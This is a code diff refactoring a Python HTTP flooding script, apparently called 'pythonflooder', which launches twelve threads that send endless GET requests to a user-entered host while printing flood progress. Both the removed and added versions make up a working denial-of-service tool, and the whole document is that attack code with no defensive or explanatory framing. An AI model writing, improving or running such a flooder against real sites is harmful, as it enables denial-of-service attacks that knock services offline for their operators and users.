@@ -1,76 +1,30 @@
 import threading
-import optparse
-import requests
-
-from os import system
-from time import sleep
-from sys import exit
+import requests as r
 
 
-def stresser():
-    global host
-    parser = optparse.OptionParser(usage="./pythonflooder.py --host IP / URL")
-    parser.add_option("--host", help="target",
-                      action="store", dest="host",
-                      type="string")
-    option, args = parser.parse_args()
-    if option.host:
-        host = option.host
-        if (host.find("http")) == -1:
-            _host = "http://", host
-        elif (host.find("http")) == 0:
-            _host = host
-        elif not option.host:
-            parser.error("--host option is required, type -h for help.")
-            exit()
-
-    while 1 < 4:
+def stresser(host):
+    while True:
         try:
-            requests.get(_host)
-            threads = threading.active_count()
-            print(f" [*] flooding {_host}. threads: {threads}")
-        except (requests.ConnectionError, requests.HTTPError):
-            print("host not found. please enter a correct URL / IP.")
+            r.get(host)
+        except (r.ConnectionError, r.HTTPError):
+            print("[*] Unable to reach the host. Try again.")
         except UnboundLocalError:
-            print("[!] please use the --host option and provide UP / URL.")
-            exit()
-        _threads_()
-
-
-def _threads_():
-    try:
-
-        threads = [
-            threading.Thread(target=stresser)
-            for _ in range(12)
-        ]
-        for t in threads:
-            t.start()
-        for t in threads:
-            t.join()
-
-    except KeyboardInterrupt:
-        exit()
+            print("[*] Incorrect host. Provide a correct one.")
+        threads_ = threading.active_count()
+        print("[*] Flooding: {}. Active threads: {}".format(host, threads_))
 
 
 def start():
-    system("cls")
-    print("========================")
-    print("pythonflooder v1.0.2")
-    print("author: frostyworks")
-    print("========================")
-    sleep(2)
-    system("cls")
-    print(f"[*] Starting to flood in: 3")
-    sleep(1)
-    system("cls")
-    print("[*] Starting to flood in: 2")
-    sleep(1)
-    system("cls")
-    print("[*] Starting to flood in: 1")
-    sleep(1)
-    system("cls")
-    stresser()
+    host = input("Enter host / URL: ")
+    threads = [threading.Thread(target=stresser, args=(host,)) for _ in range(12)]
+
+    for t in threads:
+        t.start()
+
+    for t in threads:
+        t.join()
+
+    stresser(host=host)
 
 
 start()
